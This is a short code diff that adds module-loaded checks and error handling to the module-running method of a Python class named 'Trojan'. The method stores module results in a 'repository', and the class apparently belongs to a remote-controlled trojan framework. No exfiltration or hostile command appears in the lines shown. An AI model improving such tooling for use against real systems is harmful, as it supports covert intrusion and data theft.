@@ -48,10 +48,15 @@ class Trojan:
         Run a module and store its result in the repository.
         """
         try:
+            if module not in sys.modules:
+                raise ImportError(f"Module {module} is not loaded.")
             result = sys.modules[module].run()
             self.store_module_result(result)
+        except ImportError as e:
+            print(f"[ERROR] Failed to import module {module}: {e}")
         except Exception as e:
             print(f"[ERROR] Failed to run module {module}: {e}")
+
 
 
     def store_module_result(self, data):
